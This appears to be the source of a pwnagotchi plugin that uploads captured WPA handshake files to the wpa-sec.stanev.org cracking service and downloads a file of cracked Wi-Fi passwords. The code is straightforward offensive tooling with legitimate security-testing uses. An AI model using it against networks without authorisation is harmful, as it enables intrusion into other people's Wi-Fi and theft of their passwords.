import os
import logging
import requests
import re
from datetime import datetime
from threading import Lock
from pwnagotchi.utils import StatusFile
from pwnagotchi import plugins
from json.decoder import JSONDecodeError


class WpaSec(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '2.1.0'
    __license__ = 'GPL3'
    __description__ = 'This plugin automatically uploads handshakes to https://wpa-sec.stanev.org'

    def __init__(self):
        self.ready = False
        self.lock = Lock()
        try:
            self.report = StatusFile('/root/.wpa_sec_uploads', data_format='json')
        except JSONDecodeError as json_err:
            os.remove("/root/.wpa_sec_uploads")
            self.report = StatusFile('/root/.wpa_sec_uploads', data_format='json')
        self.options = dict()
        self.skip = list()

    def _upload_to_wpasec(self, path, timeout=30):
        """
        Uploads the file to https://wpa-sec.stanev.org, or another endpoint.
        """
        with open(path, 'rb') as file_to_upload:
            cookie = {'key': self.options['api_key']}
            payload = {'file': file_to_upload}

            try:
                result = requests.post(self.options['api_url'],
                                       cookies=cookie,
                                       files=payload,
                                       timeout=timeout)
                if ' already submitted' in result.text:
                    logging.warning("%s was already submitted.", path)
            except requests.exceptions.RequestException as req_e:
                raise req_e

    def _filter_handshake_file(self, handshake_filename):
        try:
            basename = os.path.basename(handshake_filename)
            ssid, bssid = basename.split('_')
            # remove the ".pcap" from the bssid (which is really just the end of the filename)
            bssid = bssid[:-5]
        except:
            # something failed in our parsing of the filename. let the file through
            return True

        return ssid not in self.options['whitelist'] and bssid not in self.options['whitelist']


    def _download_from_wpasec(self, output, timeout=30):
        """
        Downloads the results from wpasec and safes them to output

        Output-Format: bssid, station_mac, ssid, password
        """
        api_url = self.options['api_url']
        if not api_url.endswith('/'):
            api_url = f"{api_url}/"
        api_url = f"{api_url}?api&dl=1"

        cookie = {'key': self.options['api_key']}
        try:
            result = requests.get(api_url, cookies=cookie, timeout=timeout)
            with open(output, 'wb') as output_file:
                output_file.write(result.content)
        except requests.exceptions.RequestException as req_e:
            raise req_e
        except OSError as os_e:
            raise os_e


    def on_loaded(self):
        """
        Gets called when the plugin gets loaded
        """
        if 'api_key' not in self.options or ('api_key' in self.options and self.options['api_key'] is None):
            logging.error("WPA_SEC: API-KEY isn't set. Can't upload to wpa-sec.stanev.org")
            return

        if 'api_url' not in self.options or ('api_url' in self.options and self.options['api_url'] is None):
            logging.error("WPA_SEC: API-URL isn't set. Can't upload, no endpoint configured.")
            return

        if 'whitelist' not in self.options:
            self.options['whitelist'] = []

        # remove special characters from whitelist APs to match on-disk format
        self.options['whitelist'] = set(map(lambda x: re.sub(r'[^a-zA-Z0-9]', '', x), self.options['whitelist']))

        self.ready = True

    def on_internet_available(self, agent):
        """
        Called in manual mode when there's internet connectivity
        """
        with self.lock:
            if self.ready:
                config = agent.config()
                display = agent.view()
                reported = self.report.data_field_or('reported', default=list())

                handshake_dir = config['bettercap']['handshakes']
                handshake_filenames = os.listdir(handshake_dir)
                handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if
                                   filename.endswith('.pcap')]

                # pull out whitelisted APs
                handshake_paths = filter(lambda path: self._filter_handshake_file(path), handshake_paths)

                handshake_new = set(handshake_paths) - set(reported) - set(self.skip)

                if handshake_new:
                    logging.info("WPA_SEC: Internet connectivity detected. Uploading new handshakes to wpa-sec.stanev.org")

                    for idx, handshake in enumerate(handshake_new):
                        display.set('status', f"Uploading handshake to wpa-sec.stanev.org ({idx + 1}/{len(handshake_new)})")
                        display.update(force=True)
                        try:
                            self._upload_to_wpasec(handshake)
                            reported.append(handshake)
                            self.report.update(data={'reported': reported})
                            logging.info("WPA_SEC: Successfully uploaded %s", handshake)
                        except requests.exceptions.RequestException as req_e:
                            self.skip.append(handshake)
                            logging.error("WPA_SEC: %s", req_e)
                            continue
                        except OSError as os_e:
                            logging.error("WPA_SEC: %s", os_e)
                            continue

                if 'download_results' in self.options and self.options['download_results']:
                    cracked_file = os.path.join(handshake_dir, 'wpa-sec.cracked.potfile')
                    if os.path.exists(cracked_file):
                        last_check = datetime.fromtimestamp(os.path.getmtime(cracked_file))
                        if last_check is not None and ((datetime.now() - last_check).seconds / (60 * 60)) < 1:
                            return

                    try:
                        self._download_from_wpasec(os.path.join(handshake_dir, 'wpa-sec.cracked.potfile'))
                        logging.info("WPA_SEC: Downloaded cracked passwords.")
                    except requests.exceptions.RequestException as req_e:
                        logging.debug("WPA_SEC: %s", req_e)
                    except OSError as os_e:
                        logging.debug("WPA_SEC: %s", os_e)
